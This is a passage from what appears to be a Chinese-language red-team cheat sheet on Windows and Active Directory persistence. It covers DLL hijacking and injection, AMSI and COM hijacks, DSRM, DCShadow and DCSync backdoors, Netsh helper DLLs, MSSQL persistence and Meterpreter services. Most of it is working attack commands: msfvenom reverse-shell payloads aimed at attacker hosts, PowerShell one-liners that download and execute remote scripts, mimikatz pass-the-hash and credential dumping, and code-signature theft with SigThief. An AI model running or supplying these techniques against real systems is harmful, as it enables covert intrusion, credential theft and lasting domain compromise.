Rattler</h2>\n<pre><code>自动化查找可劫持的DLL\nhttps://github.com/sensepost/rattler\n使用\n&gt;Rattler_x64.exe calc.exe 1\n会列出可被劫持的DLL\n</code></pre>\n<p><img data-src=\"471.png\" alt=\"\" /></p>\n<pre><code>按程序读取DLL位置顺序，把恶意DLL放入程序同目录后，执行程序即可。\n</code></pre>\n<p><img data-src=\"472.png\" alt=\"\" /><br />\n<img data-src=\"473.png\" alt=\"\" /></p>\n<h3 id=\"dll代理劫持右键\"><a class=\"anchor\" href=\"#dll代理劫持右键\">#</a> DLL 代理劫持右键</h3>\n<pre><code>右键对应的注册表路径是\nHKLM\\Software\\Classes\\*\\ShellEx\\ContextMenuHandlers\n使用autoruns查看加载的DLL\n</code></pre>\n<p><img data-src=\"474.png\" alt=\"\" /></p>\n<pre><code>以rarext.dll为例\n使用https://github.com/rek7/dll-hijacking创建代理DLL\n注意修改parse.py中dumpbin.exe的位置\n</code></pre>\n<p><img data-src=\"475.png\" alt=\"\" /></p>\n<pre><code>&gt;python3 parse.py -d rarext.dll\n</code></pre>\n<p><img data-src=\"476.png\" alt=\"\" /></p>\n<pre><code>修改原DLL为rarext_.dll，重新生成解决方案命名为rarext.dll\n将两个DLL放入原目录，重启\n</code></pre>\n<h3 id=\"使用amsi扫描接口维持权限\"><a class=\"anchor\" href=\"#使用amsi扫描接口维持权限\">#</a> 使用 AMSI 扫描接口维持权限</h3>\n<pre><code>https://gist.github.com/b4rtik/48ef702603d5e283bc81a05a01fccd40\n现amsi已经集成到win10以下组件中\nUAC\nPowerShell\nWindows脚本（wscript.exe和cscript.exe）\nJavaScript和VBScript\nOffice VBA宏\n</code></pre>\n<p><img data-src=\"721.png\" alt=\"\" /></p>\n<pre><code>这里使用nc来反弹个shell\n</code></pre>\n<p><img data-src=\"722.png\" alt=\"\" /></p>\n<pre><code>使用regsvr32注册dll或手动添加\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\GUID（默认）REG_SZ “提供程序描述”\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\GUID\\InprocServer32 (默认)\nREG_EXPAND_SZ &quot; DLL的路径&quot; -ThreadingModel REG_SZ &quot;Both&quot;\nHKLM \\ SOFTWARE \\ Microsoft \\ AMSI \\ Providers \\ GUID\nRegsvr32使用超管权限\n</code></pre>\n<p><img data-src=\"723.png\" alt=\"\" /></p>\n<pre><code>一旦注册，Dll将被加载到任何涉及AMSI和SampleAmsiProvider::Scan方法的进程中，比如在程序中设定，在powershell下发送字符串，触发scan方法，当发送字符串为我们设定的字符串的时候就触发恶意DLL\n</code></pre>\n<p><img data-src=\"724.png\" alt=\"\" /><br />\n<img data-src=\"725.png\" alt=\"\" /></p>\n<h3 id=\"dll劫持计划任务\"><a class=\"anchor\" href=\"#dll劫持计划任务\">#</a> DLL 劫持计划任务</h3>\n<pre><code>function Invoke-ScheduledTaskComHandlerUserTask\n&#123;\n[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]\nParam (\n[Parameter(Mandatory = $True)]\n[ValidateNotNullOrEmpty()]\n[String]\n$Command,\n\n[Switch]\n$Force\n)\n$ScheduledTaskCommandPath = &quot;HKCU:\\Software\\Classes\\CLSID\\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\\InprocServer32&quot;\nif ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null))&#123;\nNew-Item $ScheduledTaskCommandPath -Force |\nNew-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null\n&#125;else&#123;\nWrite-Verbose &quot;Key already exists, consider using -Force&quot;\nexit\n&#125;\n\nif (Test-Path $ScheduledTaskCommandPath) &#123;\nWrite-Verbose &quot;Created registry entries to hijack the UserTask&quot;\n&#125;else&#123;\nWrite-Warning &quot;Failed to create registry key, exiting&quot;\nexit\n&#125; \n&#125;\n</code></pre>\n<pre><code>Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\\test\\testmsg.dll&quot; -Verbose\n重启权限可维持\n</code></pre>\n<h3 id=\"dll注入\"><a class=\"anchor\" href=\"#dll注入\">#</a> DLL 注入</h3>\n<h2 id=\"-606\"><a class=\"anchor\" href=\"#-606\">#</a> </h2>\n<h2 id=\"powershell-8\"><a class=\"anchor\" href=\"#powershell-8\">#</a> Powershell</h2>\n<pre><code>生成DLL\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=6666 -f dll -o /var/www/html/x.dll\n&gt;use exploit/multi/handler\n&gt;set payload windows/x64/meterpreter/reverse_tcp\n&gt;Powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.105/powersploit/CodeExecution/Invoke-DllInjection.ps1'); Invoke-DllInjection -ProcessID pid -Dll .\\1.dll&quot;\n</code></pre>\n<h2 id=\"-607\"><a class=\"anchor\" href=\"#-607\">#</a> </h2>\n<h2 id=\"injectproc\"><a class=\"anchor\" href=\"#injectproc\">#</a> InjectProc</h2>\n<pre><code>生成DLL\n#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/qq.dll\n#use exploit/multi/handler\n#set payload windows/x64/meterpreter/reverse_tcp\n使用如下命令注入进程\n&gt;InjectProc.exe dll_inj qq.dll xx.exe(存在的进程)\n</code></pre>\n<p><img data-src=\"477.png\" alt=\"\" /></p>\n<h3 id=\"通过控制面板加载项维持权限\"><a class=\"anchor\" href=\"#通过控制面板加载项维持权限\">#</a> 通过控制面板加载项维持权限</h3>\n<pre><code>编译为dll，这里是弹框测试\n</code></pre>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"pch.h\"</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//Cplapplet</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token string\">\"C\"</span> <span class=\"token function\">__declspec</span><span class=\"token punctuation\">(</span>dllexport<span class=\"token punctuation\">)</span> LONG <span class=\"token function\">Cplapplet</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    HWND hwndCpl<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    UINT msg<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    LPARAM lParam1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    LPARAM lParam2</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">MessageBoxA</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"inject control panel.\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Control Panel\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>BOOL APIENTRY <span class=\"token function\">DllMain</span><span class=\"token punctuation\">(</span>HMODULE hModule<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    DWORD  ul_reason_for_call<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    LPVOID lpReserved</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>ul_reason_for_call<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_PROCESS_ATTACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">Cplapplet</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_THREAD_ATTACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_THREAD_DETACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_PROCESS_DETACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"680.png\" alt=\"\" /></p>\n<pre><code>添加到注册表中，只要运行control命令打开控制面板即可加载dll\nreg add &quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\CPLs&quot; /v spotless /d &quot;C:\\xxx\\dll.dll&quot; /f\n</code></pre>\n<p><img data-src=\"681.png\" alt=\"\" /></p>\n<h2 id=\"通过自定义net垃圾回收机制进行dll注入\"><a class=\"anchor\" href=\"#通过自定义net垃圾回收机制进行dll注入\">#</a> 通过自定义.net 垃圾回收机制进行 DLL 注入</h2>\n<pre><code>低权限用户可指定.net应用程序使用自定义垃圾收集器（GC），一个自定义GC可以以COMPLUS_GCName此环境变量指定，只需将此环境变量指向到恶意DLL，自定义GC的DLL需要一个名为GC_VersionInfo的导出表。\n下面是个弹框DLL\n</code></pre>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>BOOL APIENTRY <span class=\"token function\">DllMain</span><span class=\"token punctuation\">(</span> HMODULE hModule<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                       DWORD  ul_reason_for_call<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                       LPVOID lpReserved</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                     <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>ul_reason_for_call<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_PROCESS_ATTACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_THREAD_ATTACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_THREAD_DETACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_PROCESS_DETACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">VersionInfo</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    UINT32 MajorVersion<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    UINT32 MinorVersion<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    UINT32 BuildVersion<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> Name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token string\">\"C\"</span> <span class=\"token function\">__declspec</span><span class=\"token punctuation\">(</span>dllexport<span class=\"token punctuation\">)</span> <span class=\"token keyword\">void</span> <span class=\"token function\">GC_VersionInfo</span><span class=\"token punctuation\">(</span>VersionInfo <span class=\"token operator\">*</span> info<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    info<span class=\"token operator\">-></span>BuildVersion <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    info<span class=\"token operator\">-></span>MinorVersion <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    info<span class=\"token operator\">-></span>BuildVersion <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">MessageBoxA</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"giao\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"giao\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"686.png\" alt=\"\" /></p>\n<pre><code>后执行任意.net程序可加载此DLL\n</code></pre>\n<p><img data-src=\"687.png\" alt=\"\" /></p>\n<pre><code>当然也可以加载shellcode\nhttps://github.com/am0nsec/MCGC\n</code></pre>\n<p><img data-src=\"688.png\" alt=\"\" /><br />\n<img data-src=\"689.png\" alt=\"\" /><br />\n<img data-src=\"690.png\" alt=\"\" /></p>\n<h3 id=\"windows-fax-dll-injection\"><a class=\"anchor\" href=\"#windows-fax-dll-injection\">#</a> Windows FAX DLL Injection</h3>\n<pre><code>恶意DLL改名为fxsst.dll放置在c:\\windows\\目录即可实现对explorer.exe的劫持\n</code></pre>\n<h3 id=\"dsrm注册表acl后门\"><a class=\"anchor\" href=\"#dsrm注册表acl后门\">#</a> DSRM + 注册表 ACL 后门</h3>\n<pre><code>&gt;reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2\n允许DSRM账户远程访问\nhttps://github.com/HarmJ0y/DAMP\n效果：域内任何用户可读取域控hash\nsystem权限执行\n&gt;psexec.exe -accepteula -s -i -d cmd.exe\n域控制器执行\nPS&gt;Add-RemoteRegBackdoor -ComputerName 域控名 -Trustee 'S-1-1-0' –Verbose\n</code></pre>\n<p><img data-src=\"478.png\" alt=\"\" /></p>\n<pre><code>域内机器执行\nhttps://raw.githubusercontent.com/HarmJ0y/DAMP/master/RemoteHashRetrieval.ps1\nPS&gt; Get-RemoteLocalAccountHash -ComputerName 域控 –Verbose\n</code></pre>\n<p><img data-src=\"479.png\" alt=\"\" /></p>\n<pre><code>域控上执行\n&gt;reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2\n</code></pre>\n<p><img data-src=\"480.png\" alt=\"\" /></p>\n<pre><code>PTH攻击，mimikatz需以管理员身份启动\n&gt;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /domain:dc /user:Administrator /ntlm:9f1770aebd442b6b624bdfe9cbc720dd&quot; exit\n</code></pre>\n<p><img data-src=\"481.png\" alt=\"\" /></p>\n<h3 id=\"dcshadowsid-history\"><a class=\"anchor\" href=\"#dcshadowsid-history\">#</a> DCShadow&amp;SID History</h3>\n<pre><code>http://192.168.0.107/ps/nishang/ActiveDirectory/Set-DCShadowPermissions.ps1\nDCShadow攻击是通过更改AD架构，使域内一台机器伪造成域控。\n此脚本可以通过修改AD对象提供DCShadow攻击的最小权限。\n运行此脚本需要DA(Domain Administrator)权限，可以使指定用户不需要DA权限使用mimikatz。\n域控：dc.zone.com\n域内机器：sub2k8.zone.com\n域内普通用户:y\n域控执行\n&gt;Set-DCShadowPermissions -Fakedc sub2k8 -Object dc -username y –Verbose\n注册sub2k8为假DC，给予用户y从sub2k8修改dc的计算机对象的权限。\n</code></pre>\n<p><img data-src=\"482.png\" alt=\"\" /></p>\n<pre><code>在sub2k8上，以本地system权限启动一个mimikatz会话，以zone\\y权限启动一个mimikatz会话。\n</code></pre>\n<p><img data-src=\"483.png\" alt=\"\" /><br />\n<img data-src=\"484.png\" alt=\"\" /></p>\n<pre><code>System权限窗口执行dcshadow攻击，修改dc的计算机属性\nZone\\y权限窗口用于推送\n添加域管理\n通过修改安全标识符，将域内普通用户y提升为域管理用户\n&gt;lsadump::dcshadow /object:y /attribute:primaryGroupID /value:512\n</code></pre>\n<p><img data-src=\"485.png\" alt=\"\" /><br />\n<img data-src=\"486.png\" alt=\"\" /><br />\n<img data-src=\"487.png\" alt=\"\" /></p>\n<pre><code>Zone\\y推送\n&gt;lsadump::dcshadow /push\n</code></pre>\n<p><img data-src=\"488.png\" alt=\"\" /></p>\n<pre><code>此时在域控上查询可见y用户已经加入域管理组。\n</code></pre>\n<p><img data-src=\"489.png\" alt=\"\" /></p>\n<pre><code>添加SIDHistory后门\n记录域管理SID\n</code></pre>\n<p><img data-src=\"490.png\" alt=\"\" /></p>\n<pre><code>&gt;Set-DCShadowPermissions -FakeDC sub2k8 -Object y -Username y -Verbose\n</code></pre>\n<p><img data-src=\"491.png\" alt=\"\" /></p>\n<pre><code>&gt;lsadump::dcshadow /object:y /attribute:sidhistory /value:S-1-5-21-2346829310-1781191092-2540298887-500\n推送\n&gt;lsadump::dcshadow /push\n</code></pre>\n<p><img data-src=\"492.png\" alt=\"\" /></p>\n<pre><code>测试\n</code></pre>\n<p><img data-src=\"493.png\" alt=\"\" /></p>\n<pre><code>域控中通过mimikatz命令可查询到SIDHistory\n</code></pre>\n<p><img data-src=\"494.png\" alt=\"\" /></p>\n<pre><code>删除SIDHistory的方法\nPS&gt;Get-ADUser -Filter &#123;name -eq &quot;y&quot;&#125; –Properties sidhistory|foreach &#123;Set-ADuser $_ –remove @&#123;sidhistory=&quot;S-1-5-21-2346829310-1781191092-2540298887-500&quot;&#125;&#125;\n</code></pre>\n<p><img data-src=\"495.png\" alt=\"\" /><br />\n<img data-src=\"496.png\" alt=\"\" /></p>\n<pre><code>删除功能规则\n输入的规则后面加参数-remove即可。\n</code></pre>\n<p><img data-src=\"497.png\" alt=\"\" /></p>\n<h3 id=\"dcsync后门\"><a class=\"anchor\" href=\"#dcsync后门\">#</a> DCSync 后门</h3>\n<pre><code>服务器管理器找到域-&gt;查看-&gt;启用高级功能-&gt;右键属性-&gt;安全-&gt;everyone完全控制\n&gt;mimikatz.exe &quot;lsadump::dcsync /domain:zone.com /user:administrator&quot; exit\n</code></pre>\n<p><img data-src=\"498.png\" alt=\"\" /></p>\n<pre><code>或使用powerview添加一条ACL(域控执行)\n&gt;Add-DomainObjectAcl -TargetIdentity &quot;DC=ZONE,DC=COM&quot; -PrincipalIdentity 域内用户 -Rights DCSync -Verbose \n</code></pre>\n<p><img data-src=\"499.png\" alt=\"\" /></p>\n<pre><code>使用此账户在域内任意主机可使用mimikatz的dcsync功能导出凭据\n</code></pre>\n<p><img data-src=\"500.png\" alt=\"\" /></p>\n<pre><code>移除ACL\n&gt;Remove-DomainObjectAcl -TargetIdentity &quot;DC=zone,DC=com&quot; -PrincipalIdentity 用户 -Rights DCSync -Verbose\n</code></pre>\n<h3 id=\"netsh-helper-dll\"><a class=\"anchor\" href=\"#netsh-helper-dll\">#</a> Netsh Helper DLL</h3>\n<pre><code>https://github.com/outflanknl/NetshHelperBeacon\nhttps://github.com/rtcrowley/Offensive-Netsh-Helper\n</code></pre>\n<h2 id=\"-608\"><a class=\"anchor\" href=\"#-608\">#</a> </h2>\n<h2 id=\"msfvenom生成dll\"><a class=\"anchor\" href=\"#msfvenom生成dll\">#</a> MSFvenom 生成 DLL</h2>\n<pre><code>生成DLL格式木马\n</code></pre>\n<p><img data-src=\"501.png\" alt=\"\" /></p>\n<pre><code>传至靶机执行命令\n&gt;netsh add helper C:\\Windows\\Temp\\help.dll\n</code></pre>\n<p><img data-src=\"502.png\" alt=\"\" /></p>\n<h2 id=\"-609\"><a class=\"anchor\" href=\"#-609\">#</a> </h2>\n<h2 id=\"msfweb_delivery\"><a class=\"anchor\" href=\"#msfweb_delivery\">#</a> MSF+web_delivery</h2>\n<pre><code>关闭netsh权限不会掉，调用的powershell\n#use exploit/multi/script/web_delivery\n&gt;set target 2            #PSH\n&gt;set payload windows/x64/meterpreter/reverse_tcp\n&gt;set lhost 192.168.0.107\n&gt;set lport 12345\n</code></pre>\n<p><img data-src=\"503.png\" alt=\"\" /></p>\n<pre><code>Visual Studio新建空白DLL项目，源文件添加现有文件\nhttps://github.com/rtcrowley/Offensive-Netsh-Helper/blob/master/netshlep.cpp \n复制生成的代码进文件中，配置管理器新建x64位数后生成解决方案，配置类型选择位动态库复制DLL到靶机执行\n</code></pre>\n<p><img data-src=\"504.png\" alt=\"\" /><br />\n<img data-src=\"505.png\" alt=\"\" /></p>\n<pre><code>&gt;netsh add helper helper.dll\n</code></pre>\n<p><img data-src=\"506.png\" alt=\"\" /></p>\n<h2 id=\"-610\"><a class=\"anchor\" href=\"#-610\">#</a> </h2>\n<h2 id=\"msfshellcode\"><a class=\"anchor\" href=\"#msfshellcode\">#</a> MSF&amp;Shellcode</h2>\n<pre><code>关闭netsh后权限会掉\nhttps://github.com/outflanknl/NetshHelperBeacon\nMSFvenom生成.c格式\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f c -o /var/www/html/1.c\nVisual Studio打开项目\n若系统是64位需设置配置管理器为64位项目，反之32(解决方案右键属性)\n</code></pre>\n<p><img data-src=\"507.png\" alt=\"\" /></p>\n<pre><code>将MSF生成shellcode粘贴进相应位置后生成解决方案。\n</code></pre>\n<p><img data-src=\"508.png\" alt=\"\" /><br />\n<img data-src=\"509.png\" alt=\"\" /></p>\n<pre><code>会在项目目录x64/Release下生成dll\n复制DLL到靶机system32目录下，执行命令\n&gt;netsh add helper C:\\Windows\\System32\\NetshHelperBeacon.dll\n</code></pre>\n<p><img data-src=\"510.png\" alt=\"\" /></p>\n<pre><code>只要启动netsh就会触发\n</code></pre>\n<p><img data-src=\"511.png\" alt=\"\" /></p>\n<h3 id=\"mssql后门\"><a class=\"anchor\" href=\"#mssql后门\">#</a> MSSQL 后门</h3>\n<pre><code>注册表自启动\n&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1');Get-SQLPersistRegRun -Verbose -Name Update -Command 'c:\\windows\\temp\\Update.exe' -Instance &quot;zone.com\\sub2k8&quot;&quot;\n重启MSSQL上线(需重启服务)\nhttp://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1\n&gt;powershell -ep bypass \n&gt;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1') \n&gt;Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance &quot;zone.com\\sub2k8&quot; -PsCommand &quot;IEX(new-object net.webclient).downloadstring('http://192.168.0.107/xxxx')&quot; 远程木马脚本可用CS/Empire生成\n&gt;net stop mssqlserver\n&gt;net start mssqlserver\n映像劫持\n&gt;powershell -nop -ep bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1');Get-SQLPersistRegDebugger -Verbose -FileName sethc.exe -Command &quot;c:\\windows\\system32\\cmd.exe&quot; -Instance &quot;zone.com\\sub2k8&quot;&quot;\nDDL事件触发\n&gt;powershell -exec bypass \n&gt;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/PowerUpSQL/Invoke-SqlServer-Persist-TriggerDDL.psm1') \n&gt;Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance &quot;zone\\sub2k8&quot; -PsCommand &quot;IEX(new-object net.webclient).downloadstring('http://192.168.0.107/xxxx')&quot;  远程木马文件可用CS/Empire生成\n&gt;Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance &quot; zone\\sub2k8&quot; -Remove   移除后门\n</code></pre>\n<h3 id=\"nssm\"><a class=\"anchor\" href=\"#nssm\">#</a> NSSM</h3>\n<pre><code>http://www.nssm.cc/release/nssm-2.24.zip\nNSSM封装可执行程序为系统服务\n&gt;nssm install 服务名称会自动弹出设置\n</code></pre>\n<p><img data-src=\"512.png\" alt=\"\" /></p>\n<pre><code>Path选择powershell的路径，arguments直接输入参数。\n启动服务\n&gt;nssm start 服务名称\n</code></pre>\n<p><img data-src=\"513.png\" alt=\"\" /></p>\n<pre><code>会上线\n</code></pre>\n<p><img data-src=\"514.png\" alt=\"\" /></p>\n<pre><code>重启电脑，权限也会维持\n删除服务\n&gt;nssm remove &lt;servicename&gt;\n</code></pre>\n<p><img data-src=\"515.png\" alt=\"\" /></p>\n<h3 id=\"添加签名\"><a class=\"anchor\" href=\"#添加签名\">#</a> 添加签名</h3>\n<pre><code>https://github.com/secretsquirrel/SigThief\n&gt;python sigthief.py -i 被窃取的文件 -t 要添加签名的恶意文件 -o 保存文件\n&gt;python sigthief.py -i rarext.dll -t rarextdwa.dll -o 1.dll\n</code></pre>\n<p><img data-src=\"516.png\" alt=\"\" /><br />\n<img data-src=\"517.png\" alt=\"\" /><br />\n<img data-src=\"518.png\" alt=\"\" /><br />\n<img data-src=\"519.png\" alt=\"\" /></p>\n<h3 id=\"metsvc\"><a class=\"anchor\" href=\"#metsvc\">#</a> Metsvc</h3>\n<pre><code>Meterpreter&gt; run metsvc -A\n在C:Windows\\TEMP下随机生成目录三个文件，创建服务metsvc 31337端口\n连接后门\nMsf&gt;use exploit/multi/handler\nMsf&gt;set payload windows/metsvc_bind_tcp\nMsf&gt;set rhost 192.168.1.2\nMsf&gt;set rport 31337\nMsf&gt;run\n删除服务\nMeterpreter &gt; run metsvc –r\n</code></pre>\n<h3 id=\"persistence\"><a class=\"anchor\" href=\"#persistence\">#</a> Persistence</h3>\n<pre><code>Meterpreter&gt;run persistence -X -i 10 -r 192.168.1.9 -p 4444\n-X系统启动时运行\n-i每隔10秒尝试连接服务端\n连接后门\nMsf&gt;use exploit/multi/handler\nMsf&gt;set payload windows/meterpreter/reverse_tcp\nMsf&gt;set lhost 192.168.1.1\nMsf&gt;set lport 4444\nMsf&gt;run\n</code></pre>\n<h3 id=\"hookpasswordchangenotify\"><a class=\"anchor\" href=\"#hookpasswordchangenotify\">#</a> 